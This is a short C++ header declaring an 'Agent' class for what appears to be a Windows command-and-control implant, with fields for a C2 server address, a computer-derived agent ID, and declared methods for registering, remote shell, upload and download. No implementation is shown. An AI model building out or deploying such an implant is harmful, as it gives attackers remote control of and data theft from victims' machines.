#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <Windows.h>



class Agent {

protected:
	// command handler.
	std::string HandlerURI;
	std::string ComputerName;
	std::string AgentID; // MD5 of computername or something
	std::string ipAddress;
	std::vector<std::string> FunctionArguments;
	unsigned int port;
	
	void Register();


public:
	// ip/port for c2server
	Agent(std::string ip, unsigned int port);
	std::string Get(std::string path);
	std::string Post(std::string path, std::string data);
	void SetArgs(std::vector<std::string> args);

	void shell();
	void upload();
	void download();

};